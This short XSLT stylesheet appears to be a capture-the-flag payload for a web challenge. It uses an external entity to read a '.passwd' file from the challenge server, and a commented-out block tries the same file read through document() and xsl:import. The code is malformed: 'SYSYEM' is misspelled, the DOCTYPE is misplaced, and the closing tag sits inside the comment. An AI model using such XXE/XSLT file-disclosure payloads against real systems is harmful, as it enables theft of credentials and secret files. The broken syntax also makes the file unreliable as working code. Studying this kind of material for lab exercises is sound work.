<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<!DOCTYPE xsl:stylesheet [
	<!ENTITY passwd SYSYEM "file:///challenge/web-serveur/ch50/.passwd" >
]>
<xsl:template match="/">
	&passwd;
</xsl:template>


<!--
<xsl:template match="/">
 <xsl:import href="file:///challenge/web-serveur/ch50/.passwd"/>
<xsl:value-of select="document('file:///challenge/web-serveur/ch50/.passwd')"/>
</xsl:template>
</xsl:stylesheet>
-->